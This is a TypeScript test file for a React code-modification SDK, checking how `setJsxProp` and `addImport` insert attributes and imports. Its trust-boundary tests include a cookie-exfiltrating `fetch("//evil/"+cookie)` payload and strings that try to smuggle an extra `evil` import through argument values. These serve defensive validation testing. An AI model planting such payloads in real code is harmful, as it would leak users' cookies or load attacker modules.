/**
 * S-001 — `setJsxProp` (REQ-RXD-04 targeting/upsert, REQ-RXD-11 value forms, REQ-RXD-12
 * trust boundary, REQ-RXD-06.1/.2/.6 validator-adjacent op behaviour). Placement/whitespace
 * scenarios (REQ-RXD-10) live in `dialect.test.ts`; the hostile-name battery and denylist
 * live in `name-validation.test.ts`.
 *
 * Every content assertion pinned as "byte-exact golden" by the signed spec compares against
 * a committed golden (constraint 7); the rest assert the literal expected string directly.
 */
import { describe, it, expect } from "bun:test";
import * as react from "../../../src/dialects/react/index.ts";
import { defineFactory } from "../../../src/core/context.ts";
import { makeSpyClient, collectModifies } from "../../support/spy-client.ts";
import { golden } from "../../support/golden.ts";

const REACT_GOLDEN_DIR = new URL("./golden/", import.meta.url).pathname;

function reactGolden(name: string): string {
  return golden(name, REACT_GOLDEN_DIR);
}

describe("setJsxProp — REQ-RXD-04 targeting trio + upsert", () => {
  it("REQ-RXD-04.1: exactly one match, no existing onClick — the attribute is inserted, rest byte-identical", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onClick", "{handleClick}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe("const el = <Button onClick={handleClick} />;\n");
  });

  it("REQ-RXD-04.2: exactly one match, existing onClick — the value is replaced, no duplicate attribute", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button onClick={oldHandler} />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onClick", "{newHandler}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    const content = modifies[0]!.modify.content;
    expect(content).toBe("const el = <Button onClick={newHandler} />;\n");
    expect(content.match(/onClick/g)).toHaveLength(1);
  });

  it("REQ-RXD-04.3: a multi-element sample — only the targeted attribute's region differs", async () => {
    const before = 'const a = <Input value="a" />;\nconst b = <Button />;\nconst c = <Input value="c" />;\n';
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp("Button", "onClick", "{f}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe(
      'const a = <Input value="a" />;\nconst b = <Button onClick={f} />;\nconst c = <Input value="c" />;\n'
    );
  });

  it("REQ-RXD-04.4: zero matches — rejects naming the missing element and suggesting .modify(), zero directives, file byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Missing", "x", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect((caught as Error).message).toBe(
      "dialect operation failed: no element named `Missing` was found — use `.modify()` to inspect the file and edit it directly."
    );
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-04.5: two matches — rejects naming the element AND the count, never silent first-match, zero directives, byte-unchanged", async () => {
    const before = "const a = <Button />;\nconst b = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp("Button", "onClick", "{f}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect((caught as Error).message).toBe(
      "dialect operation failed: `Button` matched 2 elements — setJsxProp requires exactly one match; use `.modify()` to disambiguate."
    );
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("sample.tsx")).toBe(before);
  });

  it("ARCH-3 (revised): a component-realistic elementName's ZERO-match echo is the FULL name — no longer mangled by the hostile-value 16-char cap", async () => {
    // ELEMENT_NAME_GRAMMAR has no length ceiling (member-chain names like `A.B.C...` are
    // legal), and a 19-char name is entirely mainstream for a React component — it must be
    // echoed IN FULL so the author can find the real element it names, not a truncated
    // fragment matching nothing in their source (post-validation echo, not a hostile-value
    // diagnostic — REQ-RXD-13's 16-char cap does not apply to this reject class).
    const longName = "A.B.C.D.E.F.G.H.I.J"; // 19 chars, passes assertValidElementName
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp(longName, "x", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    const message = (caught as Error).message;
    expect(message).toContain(longName);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("ARCH-3 (revised): a component-realistic elementName's MULTI-match echo is the FULL name", async () => {
    const longName = "A.B.C.D.E.F.G.H.I.J";
    const before = `const a = <${longName} />;\nconst b = <${longName} />;\n`;
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp(longName, "onClick", "{f}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    const message = (caught as Error).message;
    expect(message).toContain(longName);
    expect(message).toContain("2");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("sample.tsx")).toBe(before);
  });

  it("ARCH-3 (new bound): an elementName exceeding the new 100-char cap is truncated WITH an explicit `…` marker, never silently cut", async () => {
    const longName = "A".repeat(150); // exceeds ELEMENT_NAME_ECHO_CAP, still grammar-valid
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp(longName, "x", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    const message = (caught as Error).message;
    expect(message).not.toContain(longName);
    expect(message).toContain(`${longName.slice(0, 100)}…`);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-04.6: exactly one <Menu.Item /> — boolean-shorthand insert, byte-exact vs golden", async () => {
    const { client, emitted } = makeSpyClient({ "menu.tsx": "const el = <Menu.Item />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("menu.tsx").setJsxProp("Menu.Item", "disabled");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies[0]?.modify.content).toBe(reactGolden("setprop-boolean-namespaced.txt"));
  });

  it("REQ-RXD-06.6: Menu.Item and my-web-component elementNames are not rejected by the validator — both proceed to targeting", async () => {
    const { client, emitted } = makeSpyClient({
      "a.tsx": "const el = <Menu.Item />;\n",
      "b.tsx": "const el = <my-web-component />;\n",
    });

    const run = defineFactory<void>(async () => {
      await react.find("a.tsx").setJsxProp("Menu.Item", "x", "{1}");
      await react.find("b.tsx").setJsxProp("my-web-component", "x", "{1}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(2);
    expect(modifies[0]?.modify.content).toBe("const el = <Menu.Item x={1} />;\n");
    expect(modifies[1]?.modify.content).toBe("const el = <my-web-component x={1} />;\n");
  });
});

describe("setJsxProp — REQ-RXD-11 value forms + REQ-RXD-12 trust boundary", () => {
  it("REQ-RXD-11.1: a quoted string value prints verbatim as the initializer, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "placeholder", '"Search…"');
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-string-value.txt"));
  });

  it("REQ-RXD-11.2: an expression-container value prints verbatim as the initializer, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "value", "{count}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-expression-value.txt"));
  });

  it("REQ-RXD-11.3: no third argument — bare boolean shorthand, no `=`, no initializer", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "required");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe("const el = <Input required />;\n");
    expect(content).not.toContain("required=");
  });

  it("REQ-RXD-11.3 (upsert half): an EXISTING valued attribute + omitted value downgrades to boolean shorthand, byte-exact golden", async () => {
    // Covers the `removeInitializer()` branch of the upsert (existing attribute, value
    // omitted) — distinct from the insert path every other no-value test exercises.
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input required={maybe} />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "required");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe(reactGolden("setprop-shorthand-downgrade.txt"));
    expect(content).not.toContain("required=");
  });

  it("REQ-RXD-11.3 (upsert half, triangulation): shorthand downgrade of a MID-position attribute preserves its position, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({
      "Input.tsx": 'const el = <Input type="text" required={maybe} className={cls} />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "required");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-shorthand-downgrade-mid.txt"));
  });

  it("REQ-RXD-11.4: an existing string-form value is replaced by an expression-form value in place, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": 'const el = <Input value="static" />;\n' });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "value", "{dynamic}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-value-form-replaced.txt"));
  });

  it("REQ-RXD-11.5: a malformed-but-delimiter-balanced value ('{1+}') is emitted verbatim — no output re-validation", async () => {
    // Deviation from the spec's own literal example (see the Deviations section of the
    // apply-progress artefact): `setJsxProp("Button", "data-x", "{")` — a value with an
    // UNTERMINATED delimiter — does not reach this op's "emitted as-is" path at all. Verified
    // directly against ts-morph@28.0.0: `JsxAttributedNode#addAttribute`/`JsxAttribute#
    // setInitializer` reparse-and-reconcile the WHOLE file after every structural edit (this
    // is ts-morph's own architecture, not a choice this SDK makes); an unclosed `{` swallows
    // every token after it into one broken expression, so the reconcile step itself throws
    // "Manipulation error: A syntax error was inserted." BEFORE any text reaches `print()`.
    // The next test pins that this failure is still safely CONTAINED (REQ-DG-05-style), not a
    // leak or a corruption — but it is a reject, not the verbatim-success this scenario names.
    // A value that is malformed (invalid JS) but delimiter-BALANCED — `'{1+}'` — still proves
    // the substance of REQ-RXD-11.5 (the op performs no semantic re-validation of `value`)
    // without hitting ts-morph's reparse ceiling.
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "data-x", "{1+}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe("const el = <Button data-x={1+} />;\n");
  });

  it("REQ-RXD-11.5 (ts-morph boundary pin): a value with an UNTERMINATED delimiter safely rejects — contained, not a silent corruption", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "data-x", "{");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toBe('dialect operation failed: setJsxProp() on "Button.tsx" threw');
    expect((caught as Error).cause).toBeUndefined();
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-12.1: an injection-shaped payload in VALUE position succeeds and is emitted verbatim (rejection twin: REQ-RXD-06.1)", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });
    const payload = '{fetch("//evil/"+cookie)}';

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onError", payload);
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(
      `const el = <Button onError=${payload} />;\n`
    );
  });

  it("REQ-RXD-06.1: the SAME payload in PROPNAME position rejects BEFORE any AST mutation — zero directives, byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });
    const hostilePropName = 'onError={fetch("//evil/"+cookie)}';

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", hostilePropName, "{x}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("propName");
    expect((caught as Error).message).not.toContain(hostilePropName);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-06.2: data-testid, aria-label, and xlink:href each succeed on their own single-match element, byte-exact golden", async () => {
    const before = "const a = <FieldA />;\nconst b = <FieldB />;\nconst c = <FieldC />;\n";
    const { client, emitted } = makeSpyClient({ "fields.tsx": before });

    const run = defineFactory<void>(async () => {
      await react
        .find("fields.tsx")
        .setJsxProp("FieldA", "data-testid", '"a"')
        .setJsxProp("FieldB", "aria-label", '"b"')
        .setJsxProp("FieldC", "xlink:href", '"c"');
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe(reactGolden("setprop-widened-propnames.txt"));
  });
});

describe("addImport — REQ-RXD-05 merge-or-create, idempotent, named-only", () => {
  it("REQ-RXD-05.1: no import from the target module — a fresh import is inserted, byte-exact vs golden", async () => {
    const { client, emitted } = makeSpyClient({ "App.tsx": "const el = <div />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("addimport-fresh.txt"));
  });

  it("REQ-RXD-05.2: an existing named-import clause from the SAME module — merges to one clause naming both", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import { useEffect } from "react";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(
      'import { useEffect, useState } from "react";\nconst el = <div />;\n'
    );
  });

  it("REQ-RXD-05.3: find(path).addImport(x, m).addImport(x, m) — a SINGLE import line, never a duplicate", async () => {
    const { client, emitted } = makeSpyClient({ "App.tsx": "const el = <div />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react").addImport("useState", "react");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    const content = modifies[0]!.modify.content;
    expect(content).toBe('import { useState } from "react";\n\nconst el = <div />;\n');
    expect(content.match(/import \{ useState \}/g)).toHaveLength(1);
  });

  it('REQ-RXD-05.4: addImport("React", "react") produces the NAMED form — never default-import synthesis', async () => {
    const { client, emitted } = makeSpyClient({ "App.tsx": "const el = <div />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("React", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import { React } from "react";\n\nconst el = <div />;\n');
    expect(content).not.toContain("import React from");
  });
});

describe("addImport — REQ-RXD-05.5-.10 (V5) — shape-aware merge/create/idempotency across non-named declaration forms", () => {
  it("REQ-RXD-05.5: a type-only clause is never a merge target — a SEPARATE value import is inserted", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import type { FC } from "react";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe(
      'import type { FC } from "react";\nimport { useState } from "react";\n\nconst el = <div />;\n'
    );
  });

  it("REQ-RXD-05.6: a default import with the SAME local name — idempotent no-op, byte-identical", async () => {
    const before = 'import React from "react";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("React", "react");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-05.7: a default import with a DIFFERENT name — a SEPARATE declaration is inserted, default kept unchanged", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import React from "react";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import React from "react";\nimport { useState } from "react";\n\nconst el = <div />;\n');
  });

  it("REQ-RXD-05.8: a namespace import with a DIFFERENT name — SUCCEEDS (no throw), a SEPARATE declaration is inserted", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import * as React from "react";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import * as React from "react";\nimport { useState } from "react";\n\nconst el = <div />;\n');
  });

  it("REQ-RXD-05.9: a namespace import with the SAME local name — idempotent no-op, byte-identical", async () => {
    const before = 'import * as React from "react";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("React", "react");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-05.10: an aliased named import — merge adds a SECOND, unaliased specifier; the alias is undisturbed", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import { useState as us } from "react";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import { useState as us, useState } from "react";\nconst el = <div />;\n');
  });
});

describe("addImport — REQ-RXD-05.11-.15 (V7) — file-wide claimed-name collision reject", () => {
  it("REQ-RXD-05.11: a same-name TYPE-ONLY declaration collision rejects BEFORE any AST mutation — Defect 1a", async () => {
    const before = 'import type { Icon } from "./icons";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("Icon", "./icons");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-05.12: a same-name INLINE type-only specifier collision rejects the same way — Defect 1b", async () => {
    const before = 'import { type Icon } from "./icons";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("Icon", "./icons");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("defect-fix (near-miss, decl-level type-only DEFAULT): `import type React from \"react\"` + addImport(\"React\", \"react\") rejects, never a silent no-op", async () => {
    const before = 'import type React from "react";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("React", "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("defect-fix (near-miss, decl-level type-only NAMESPACE): `import type * as React from \"react\"` + addImport(\"React\", \"react\") rejects, never a silent no-op", async () => {
    const before = 'import type * as React from "react";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("React", "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-05.13: a DIFFERENTLY-ALIASED type-only import does NOT collide — boundary case", async () => {
    const { client, emitted } = makeSpyClient({
      "App.tsx": 'import type { Icon as IconT } from "./icons";\nconst el = <div />;\n',
    });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("Icon", "./icons");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe(
      'import type { Icon as IconT } from "./icons";\nimport { Icon } from "./icons";\n\nconst el = <div />;\n'
    );
  });

  it("REQ-RXD-05.14: a CROSS-module local-name collision rejects — Defect 2", async () => {
    const before = 'import { useState } from "react";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("useState", "./local");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-05.15: an ALIASED same-module local-name collision rejects — Defect 3", async () => {
    const before = 'import { Foo as x } from "./a";\nconst el = <div />;\n';
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("x", "./a");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });
});

describe("addImport.name grammar divergence pin — the import-binding grammar, not the attribute grammar (QA-5 runner-up)", () => {
  it('"$" is a valid import binding (single-char identifier grammar) and is accepted', async () => {
    const { client, emitted } = makeSpyClient({ "App.tsx": "const el = <div />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("$", "react");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import { $ } from "react";\n\nconst el = <div />;\n');
  });

  it('"data-testid" is NOT a valid import binding (hyphens belong only to the attribute-name grammar) and is rejected', async () => {
    const before = "const el = <div />;\n";
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("data-testid", "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });
});

describe("addImport — REQ-RXD-06.3/.4 splice safety (name breakout rejected, from escaped as one string)", () => {
  it("REQ-RXD-06.3: a name attempting to close the clause and smuggle a second import rejects, zero new imports, byte-unchanged", async () => {
    const before = "const el = <div />;\n";
    const { client, emitted } = makeSpyClient({ "App.tsx": before });
    const hostileName = 'x } from "evil"; import { y';

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport(hostileName, "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("REQ-RXD-06.4: a hostile `from` attempting to terminate its own string literal stays ONE escaped import, no `evil` import", async () => {
    const { client, emitted } = makeSpyClient({ "App.tsx": "const el = <div />;\n" });
    const hostileFrom = 'a"; import {y} from "evil';

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("X", hostileFrom);
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe('import { X } from "a\\"; import {y} from \\"evil";\n\nconst el = <div />;\n');
    expect(content.match(/^import /gm)).toHaveLength(1);
    expect(content).not.toContain('from "evil"');
  });
});
